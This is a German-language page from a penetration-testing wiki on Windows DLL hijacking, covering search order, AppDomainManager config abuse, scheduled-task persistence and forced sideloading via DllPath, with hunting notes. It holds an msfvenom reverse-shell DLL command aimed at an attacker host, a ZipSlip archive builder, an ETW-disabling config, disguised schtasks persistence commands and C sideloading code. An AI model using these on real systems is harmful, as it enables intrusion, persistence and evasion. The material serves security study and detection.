# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

Bei DLL Hijacking wird eine vertrauenswürdige Anwendung dazu gebracht, eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Die Methode wird hauptsächlich für Codeausführung und Persistenz eingesetzt und seltener zur Privilegieneskalation. Obwohl hier der Schwerpunkt auf der Eskalation liegt, bleibt die Hijacking-Methode für alle Ziele gleich.

### Gängige Techniken

Für DLL Hijacking kommen verschiedene Methoden zum Einsatz. Wie effektiv sie sind, hängt davon ab, wie die Anwendung DLLs lädt:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Eine echte DLL wird durch eine bösartige ersetzt. Optional kann DLL Proxying eingesetzt werden, um die Funktionalität der Original-DLL beizubehalten.
2. **DLL Search Order Hijacking**: Die bösartige DLL wird in einem Suchpfad platziert, der vor dem Pfad der legitimen DLL durchsucht wird. Dabei wird das Suchmuster der Anwendung ausgenutzt.
3. **Phantom DLL Hijacking**: Eine bösartige DLL wird erstellt, die eine Anwendung zu laden versucht, weil sie davon ausgeht, dass es sich um eine benötigte, aber nicht vorhandene DLL handelt.
4. **DLL Redirection**: Suchparameter wie `%PATH%` oder Dateien wie `.exe.manifest` / `.exe.local` werden geändert, damit die Anwendung die bösartige DLL lädt.
5. **WinSxS DLL Replacement**: Die legitime DLL wird im WinSxS-Verzeichnis durch eine bösartige ersetzt. Diese Methode wird häufig mit DLL Side-Loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Die bösartige DLL wird zusammen mit der kopierten Anwendung in einem vom Benutzer kontrollierten Verzeichnis platziert. Dies ähnelt Binary Proxy Execution-Techniken.

Eine Anwendung kann auch einen **eigenen DLL-Loader** implementieren. Ein privilegierter Prozess kann ein Unterverzeichnis wie `Libraries` oder `Plugins` durchsuchen und eine ausgewählte DLL an einen Hilfsprozess übergeben, unabhängig von der normalen Windows-DLL-Suchreihenfolge. Wenn ein anderes Konto Dateien in genau diesem Verzeichnis erstellen kann, sollte dies als Ansatzpunkt für eine genauere Prüfung betrachtet werden: Identität des Prozesses, effektive ACL des Verzeichnisses, Dateiauswahlregel und ein erreichbarer Ladevorgang müssen bestätigt werden. Ein beschreibbares Verzeichnis neben einer ausführbaren Datei belegt nicht, dass der Prozess DLLs daraus lädt.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + Angreifer-Assembly)

Klassisches DLL Side-Loading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Angreifercode zu laden. Wenn es sich bei der Zieldatei um eine **verwaltete** Anwendung handelt, durchsucht die CLR auch eine nach der ausführbaren Datei benannte **Anwendungskonfigurationsdatei** (zum Beispiel `Setup.exe.config`). In dieser Datei kann ein benutzerdefinierter **AppDomainManager** definiert werden. Verweist die Konfiguration auf eine vom Angreifer kontrollierte Assembly, die neben der EXE liegt, lädt die CLR diese **vor dem normalen Codepfad der Anwendung** und führt sie im vertrauenswürdigen Prozess aus.<sup>[[24]](#references)</sup>

Laut dem Konfigurationsschema von Microsoft für .NET Framework müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimaler Manager:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktische Hinweise:
- Dies ist **spezifisches .NET Framework-Tradecraft**. Es basiert auf der CLR-Konfigurationsanalyse, nicht auf der Win32-DLL-Suchreihenfolge.
- Der Host muss tatsächlich eine **managed EXE** sein. Schnelle Triage: `sigcheck -m target.exe`, `corflags target.exe` oder in den PE-Metadaten nach dem **CLR Runtime Header** suchen.
- Der Konfigurationsdateiname muss exakt dem Namen der ausführbaren Datei entsprechen (`<binary>.config`) und befindet sich normalerweise **neben der EXE**.
- Dies ist bei **signierten Microsoft-/Vendor-Binaries** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed Assembly im selben Prozess ausgeführt wird.
- Wenn du bereits über ein beschreibbares Installer-/Update-Verzeichnis verfügst, kann AppDomainManager Hijacking als **erste Stufe** eingesetzt werden, gefolgt von klassischem DLL Sideloading oder Reflective Loading für spätere Stufen.

### AppDomainManager als Downloader + Bootstrap für geplante Aufgaben

Ein praktisches Intrusion-Muster kombiniert die vertrauenswürdige managed EXE mit einer bösartigen `*.config` und einer bösartigen AppDomainManager-DLL, die lediglich als **kleiner Bootstrapper** dient:<sup>[[25]](#references)</sup>

1. Der Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die danebenliegende Konfiguration veranlasst die CLR, die Assembly des Angreifers zu laden, **bevor** die Logik der legitimen Anwendung startet.
3. Der bösartige Manager führt eine **Pfadprüfung** durch (zum Beispiel nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die Ausführung der zweiten Stufe nur aus `%LOCALAPPDATA%` zulassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die eigentliche Payload in einen benutzerbeschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet mit einer geplanten Aufgabe Persistenz ein.

Warum diese Variante wichtig ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, die nur den Hash der Hauptdatei prüft, den Kompromiss möglicherweise übersieht.
- Einfache **pfadbasierte Anti-Analyse** ist weit verbreitet: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, nach Temp oder in einen Sandbox-Pfad kann die Ausführungskette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein und unauffällig bleiben, während das eigentliche Implantat später abgerufen wird.

Minimales Persistenzbeispiel, das bei diesem Muster häufig vorkommt:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigung** für diesen Benutzer/diese Sitzung; dies führt nicht automatisch zu einer SYSTEM-Eskalation.
- Diese Technik lässt sich oft besser als **Ausführung/Persistenz durch .NET-Konfigurationsmissbrauch** einordnen denn als klassisches Hijacking der DLL-Suchreihenfolge aufgrund einer fehlenden DLL, auch wenn Angreifer häufig beides kombinieren.

Erkennungshinweise:
- Signierte .NET-Executables, die aus **ZIP-Entpackungspfaden**, `Downloads`, `%TEMP%` oder anderen benutzerschreibbaren Ordnern gestartet werden und neben denen sich eine `<exe>.config` befindet.
- Neue geplante Tasks, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser- oder Hersteller-Updatern nachempfunden sind.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort eine weitere EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, sofern der Pfad der ausführbaren Datei nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Hijacking eines vorhandenen geplanten Tasks, um die Sideloading-Kette erneut zu starten

Für Persistenz sollte man nicht nur nach dem **Erstellen eines neuen Tasks** suchen. Manche Angreifergruppen warten, bis ein legitimer Installer einen **gewöhnlichen Updater-Task** erstellt, und ändern dann die Task-Aktion, sodass Name, Autor und Trigger für Verteidiger vertraut bleiben.

Wiederverwendbarer Ablauf:
1. Installiere/starte die legitime Software und ermittle den Task, den sie normalerweise erstellt.
2. Exportiere die Task-XML und notiere die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetze nur die Aktion, sodass der Task deine **vertrauenswürdige Host-EXE** aus einem benutzerschreibbaren Staging-Verzeichnis startet, die dann das echte Payload per Sideloading oder AppDomain lädt.
4. Registriere denselben Task-Namen erneut, anstatt ein neues, offensichtliches Persistenzartefakt zu erstellen.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Warum es unauffälliger ist:
- Der Task-Name kann weiterhin legitim wirken (zum Beispiel wie der eines Updaters eines Herstellers).
- Der **Task Scheduler-Dienst** startet ihn. Daher sieht eine Validierung von Eltern- und Vorfahrenprozessen oft die erwartete Aufgabenplanungskette statt `explorer.exe`.
- DFIR-Teams, die nur nach **neuen Task-Namen** suchen, übersehen möglicherweise einen Task, dessen Registrierung bereits bestand, dessen Aktion jetzt aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Hunting-Ansatzpunkte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erstelle einen Alert, wenn ein **wie ein Hersteller-Updater wirkender Task** aus **benutzerschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine Schritt-für-Schritt-Angriffskette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL sideloading kombiniert, findest du im folgenden Workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Am häufigsten findet man fehlende DLLs auf einem System, indem man [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals ausführt und **die folgenden 2 Filter einstellt**:

![Gängige Techniken – Fehlende DLLs finden: Am häufigsten findet man fehlende DLLs auf einem System, indem man procmon von Sysinternals ausführt und die folgenden 2 Filter einstellt](<../../../images/image (961).png>)

![Gängige Techniken – Fehlende DLLs finden: Am häufigsten findet man fehlende DLLs auf einem System, indem man procmon von Sysinternals ausführt und die folgenden 2 Filter einstellt](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigt:

![Gängige Techniken – Fehlende DLLs finden: und nur die File System Activity anzeigt](<../../../images/image (153).png>)

Wenn du nach **fehlenden DLLs allgemein** suchst, **lässt** du Procmon einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL in einer bestimmten ausführbaren Datei** suchst, legst du einen weiteren Filter fest, zum Beispiel **"Process Name" "contains" `<exec name>`**, führst die Datei aus und beendest dann die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um deine Berechtigungen zu erweitern, suche nach einer **DLL, die ein privilegierter Prozess zu laden versucht** und in ein Verzeichnis geschrieben werden kann, auf das du Schreibzugriff hast. Das kann passieren, wenn du ein Verzeichnis kontrollierst, das vor dem Verzeichnis mit der legitimen DLL durchsucht wird, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du, wie DLLs genau geladen werden.**

**Windows-Anwendungen** suchen nach DLLs anhand einer Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge. DLL hijacking entsteht, wenn eine schädliche DLL gezielt in einem dieser Verzeichnisse platziert wird, sodass sie vor der legitimen DLL geladen wird. Um dies zu verhindern, sollte die Anwendung beim Verweis auf benötigte DLLs absolute Pfade verwenden.

Die **DLL-Suchreihenfolge auf 32-Bit-Systemen** ist wie folgt:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Mit der Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) erhältst du den Pfad zu diesem Verzeichnis.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad zu diesem Verzeichnis ermittelt, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Mit der Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) erhältst du den Pfad zu diesem Verzeichnis.
   1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der Umgebungsvariable PATH aufgeführt sind. Beachte, dass dies nicht den anwendungsspezifischen Pfad aus dem Registrierungsschlüssel **App Paths** einschließt. Der Schlüssel **App Paths** wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Das ist die **Standardsuchreihenfolge**, wenn **SafeDllSearchMode** aktiviert ist. Ist die Funktion deaktiviert, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wird die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Eine DLL kann schließlich auch über ihren absoluten Pfad statt über ihren Namen geladen werden. In diesem Fall sucht Windows die DLL selbst nur an diesem Pfad. Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der jeweils geltenden Suchreihenfolge.

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu ändern, aber ich werde sie hier nicht erläutern.

### Einen beliebigen Dateischreibzugriff mit einem Hijack einer fehlenden DLL verketten

**Verwandte Technik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu erfassen, nach denen der Prozess sucht, die er aber nicht findet.<sup>[[14]](#references)</sup>
2. Wenn die Binärdatei nach einem **Zeitplan oder als Service** läuft, wird eine DLL mit einem dieser Namen beim nächsten Start geladen, wenn du sie im **Anwendungsverzeichnis** (Eintrag Nr. 1 der Suchreihenfolge) ablegst. In einem Fall mit einem .NET-Scanner suchte der Prozess in `C:\samples\app\` nach `hostfxr.dll`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein **beliebiger Schreibzugriff im ZipSlip-Stil** ist, erstelle ein ZIP-Archiv, dessen Eintrag das Extraktionsverzeichnis verlässt, sodass die DLL im Anwendungsverzeichnis landet:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Lege das Archiv im überwachten Posteingang/Freigabeverzeichnis ab; wenn die geplante Aufgabe den Prozess erneut startet, lädt er die bösartige DLL und führt deinen Code als Dienstkonto aus.

### Sideloading erzwingen über RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, den DLL-Suchpfad eines neu erstellten Prozesses gezielt zu beeinflussen, besteht darin, beim Erstellen des Prozesses über die nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS festzulegen. Wird hier ein vom Angreifer kontrolliertes Verzeichnis angegeben, kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (ohne absoluten Pfad und ohne sichere Ladeflags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Grundidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Zieldatei eine DLL anhand ihres Namens auflöst, berücksichtigt der Loader bei der Auflösung den angegebenen DllPath. So wird zuverlässiges Sideloading ermöglicht, auch wenn sich die bösartige DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies wirkt sich auf den erstellten untergeordneten Prozess aus; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder LoadLibrary verwenden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht hijacked werden. Weitergeleitete Exporte und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, Wide Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: DLL-Sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath erzwingen</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Beispiel für die praktische Verwendung
- Platziere eine schädliche xmllite.dll (die erforderlichen Funktionen exportierend oder als Proxy zur echten DLL) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binärdatei, von der bekannt ist, dass sie mithilfe der obigen Technik xmllite.dll anhand des Namens sucht. Der Loader löst den Import über den angegebenen DllPath auf und sideloadet deine DLL.

Diese Technik wurde in freier Wildbahn beobachtet, um mehrstufige Sideloading-Ketten anzutreiben: Ein initialer Launcher legt eine Hilfs-DLL ab, die dann eine von Microsoft signierte, hijackbare Binärdatei mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager-Hijacking über `.exe.config`

Bei **.NET Framework**-Zielen kann Sideloading **vor `Main()`** erfolgen, ohne den Speicher zu patchen, indem die an die Anwendung angrenzende Datei **`.exe.config`** missbraucht wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer schädlichen Konfigurationsdatei und einer oder mehreren vom Angreifer kontrollierten Assemblys.

So funktioniert die Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE wird gestartet und die **CLR liest `<exe>.config`**.
2. Die Konfiguration legt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`** fest, sodass die Laufzeitumgebung einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der schädliche Manager erhält **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Konfiguration kann die CLR dazu zwingen, zuerst lokale Assemblys aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) und die Laufzeitvalidierung/Telemetrie ohne Inline-Patching abzuschwächen.

Muster im Stil einer Kampagne (die genaue Verschachtelung kann je nach Direktive / CLR-Version variieren):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Warum das nützlich ist:
- **`<probing privatePath="."/>`** hält die Assembly-Auflösung im Anwendungsverzeichnis und macht den Ordner so zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Angreifercode, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann einer Full-Trust-App ermöglichen, unsignierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** verhindert Weiterleitungen durch Publisher-Policies zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sorgt für eine besser vorhersehbare Runtime-Auswahl.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit über die Konfiguration deaktiviert**, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In aktuellen Kampagnen beobachtetes Vorgehen:
- Phase 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Phase 2 kopiert diese in einen glaubwürdig wirkenden **AppData-Update**-Ordner, benennt den Host etwa in `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Phase 3 überprüft den Ausführungskontext (zum Beispiel den erwarteten übergeordneten Prozess `svchost.exe` vom Task Scheduler), bevor die finale RAT-DLL bzw. der Export geladen wird.

Hunting-Ideen:
- Signierte oder anderweitig legitime **.NET-Executables**, die an verdächtigen, benachbarten **`.config`**-Dateien in benutzerschreibbaren Speicherorten ausgeführt werden.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen Verzeichnissen wie `\bin\update\` erneut starten.
- Eltern-Kind-Prozessketten, in denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der unmittelbar danach nicht vom Hersteller stammende Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen bei der DLL-Suchreihenfolge laut Windows-Dokumentation

In der Windows-Dokumentation werden bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge aufgeführt:

- Wenn eine **DLL gefunden wird, deren Name mit dem einer bereits im Speicher geladenen DLL übereinstimmt**, umgeht das System die übliche Suche. Stattdessen prüft es zunächst auf Redirects und ein Manifest und verwendet andernfalls die bereits im Speicher befindliche DLL. **In diesem Szenario sucht das System nicht nach der DLL**.
- Wird eine DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt, verwendet das System seine Version dieser bekannten DLL sowie alle zugehörigen abhängigen DLLs **ohne Suchvorgang**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- Hat eine **DLL Abhängigkeiten**, werden diese abhängigen DLLs so gesucht, als wären sie nur durch ihre **Modulnamen** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad gefunden wurde.

### Privilegienerweiterung

**Voraussetzungen**:

- Einen Prozess identifizieren, der mit **anderen Berechtigungen** ausgeführt wird oder ausgeführt werden soll (horizontale oder laterale Bewegung) und dem eine **DLL** fehlt.
- Sicherstellen, dass **Schreibzugriff** auf ein beliebiges **Verzeichnis** besteht, in dem nach der **DLL** gesucht wird. Das kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Diese Voraussetzungen sind standardmäßig selten erfüllt: Bei privilegierten Executables fehlen normalerweise keine DLL-Abhängigkeiten, und Standardbenutzer können üblicherweise nicht in System-Suchpfadverzeichnisse schreiben. Fehlkonfigurierte Umgebungen können dennoch beide Bedingungen erfüllen.\
Wenn die Voraussetzungen erfüllt sind, solltest du das Projekt [UACME](https://github.com/hfiref0x/UACME) prüfen. Obwohl sein Hauptziel der UAC-bypass ist, enthält es PoCs für DLL-Hijacking für bestimmte Windows-Versionen, die sich oft an das gefundene beschreibbare Verzeichnis anpassen lassen.

Beachte, dass du **deine Berechtigungen in einem Ordner überprüfen** kannst, indem du Folgendes ausführst:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Du kannst auch die Imports einer ausführbaren Datei und die Exports einer DLL mit Folgendem überprüfen:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Für eine vollständige Anleitung, wie du **DLL Hijacking missbrauchen kannst, um deine Berechtigungen zu erweitern**, wenn du Schreibrechte auf einen **Systempfad-Ordner** hast, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibrechte auf einen Ordner innerhalb des System-PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle aufzuspüren, sind die **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist eines der wichtigsten Dinge für einen erfolgreichen Exploit, eine DLL zu **erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei aus ihr importiert**. Beachte jedoch, dass DLL Hijacking nützlich ist, um [von der mittleren Integritätsstufe auf die hohe **(unter Umgehung von UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **hoher Integrität auf SYSTEM**](../index.html#from-high-integrity-to-system)** zu eskalieren.** Ein Beispiel dafür, **wie man eine gültige DLL erstellt**, findest du in dieser Studie zu DLL Hijacking für die Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** nützlich sein oder zum Erstellen einer **DLL mit nicht erforderlichen exportierten Funktionen** dienen können.

## **DLLs erstellen und kompilieren**

### **DLL Proxifying**

